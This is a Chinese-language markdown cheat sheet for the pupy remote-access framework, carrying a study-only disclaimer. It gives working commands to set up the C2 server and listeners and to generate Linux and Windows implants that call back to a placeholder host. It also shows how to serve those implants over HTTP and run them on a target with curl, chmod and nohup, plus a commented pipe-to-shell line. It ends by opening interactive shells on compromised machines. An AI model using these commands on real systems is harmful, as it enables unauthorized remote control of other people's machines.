# pupy

---

## 免责声明

`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`

---

**项目地址**
- https://github.com/n1nj4sec/pupy

**相关文章**
- [pupy安装与使用](https://mp.weixin.qq.com/s/7VyJHHvUHITY61RC8VveOQ)
- [Pupy利用分析——Windows平台下的功能](https://3gstudent.github.io/Pupy%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90-Windows%E5%B9%B3%E5%8F%B0%E4%B8%8B%E7%9A%84%E5%8A%9F%E8%83%BD)

---

## 安装

**Docker 安装**
```bash
curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun
docker pull alxchk/pupy:unstable

systemctl stop systemd-resolved

# 端口映射
docker run -d --name pupy-server -p 2022:22 -p 53:53 -p 80:80 -p 443:443 -v /tmp/projects:/projects alxchk/pupy:unstable

# ssh-keygen 免交互
# yes | ssh-keygen -t rsa -N "" -C "test@email.com" -f ~/.ssh/id_rsa_pupy
# yes | ssh-keygen -t rsa -N "" -f ~/.ssh/id_rsa_pupy
yes | ssh-keygen -t rsa -N "" -C "test@email.com" -f ~/.ssh/id_rsa_pupy
cp ~/.ssh/id_rsa_pupy.pub /tmp/projects/keys/authorized_keys

# ssh首次交互免输入yes
ssh -i ~/.ssh/id_rsa_pupy -p 2022 -o stricthostkeychecking=no pupy@127.0.0.1
```

---

## 使用

**进入 pupy 后**
```bash
# 监听器
listen -r ssl
listen -a ssl 53

# 生成 shell
gen -f client -O linux -A x64 connect --host x.x.x.x:53 -t ssl
gen -f client -O windows -A x64 connect --host x.x.x.x:53 -t ssl
```

```bash
# 进容器起py服务器
docker exec -it pupy-server /bin/sh
cd /projects/default/output/
python -m SimpleHTTPServer 8989
```

**目标机器上线**
```bash
curl http://x.x.x.x:8989/pupyx64.0E8pp4.lin -o test
chmod +x test
nohup ./test &

# curl http://x.x.x.x:8989/test|sh
```

**pupy 上查看**
```bash
# 成功连接后
sessions

sessions -i [id]
shell
```
